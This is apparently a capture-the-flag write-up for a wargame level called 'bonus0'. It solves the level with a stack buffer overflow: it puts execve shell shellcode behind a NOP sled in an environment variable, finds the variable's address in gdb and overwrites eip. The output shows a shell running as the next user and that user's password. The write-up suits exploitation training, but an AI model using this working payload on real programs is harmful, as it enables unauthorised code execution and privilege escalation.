# bonus0

We can use a environment variable to store the shellcode this time.  

```sh
$> export SHELLCODE=$(python -c 'print("\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

We then retrieve the `SHELLCODE`'s address :
```sh
$> gdb -q bonus0
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/32s *((char **)environ)
0xbffff868:	 "SHELLCODE=[...]"
[...]
```

To be sure, we added a bunch of no-ops padding before the actual shellcode.  

By using a pattern, we found that `eip` offset is `9` bytes.

Then we can apply the payload :

```sh
$> (python -c 'print("\x90"*100)'; python -c 'print("\x90"*9 + "\x88\xf8\xff\xbf" + "\x90"*100)'; cat ) | ./bonus0
 - 
 - 
[...]
$ whoami
bonus1
$ cat /home/user/bonus1/.pass 
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
*note that in `print("\x90"*100)`, `100` is purely random. it just have to be overflowing the buffer which is `20 bytes`.*
